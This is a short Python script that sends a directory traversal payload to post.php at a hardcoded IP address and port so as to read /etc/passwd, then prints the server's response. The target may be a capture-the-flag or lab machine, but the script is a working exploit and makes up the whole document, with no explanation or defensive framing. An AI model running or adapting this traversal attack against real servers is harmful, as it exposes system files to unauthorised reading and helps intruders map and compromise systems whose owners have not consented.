import requests

# Crafted payload for directory traversal
payload = "../../../../../../etc/passwd"

# Target URL with crafted payload
url = "http://13.36.65.25:32780/post.php?id=" + payload

# Send GET request with crafted payload
response = requests.get(url)

# Print the response content
print(response.text)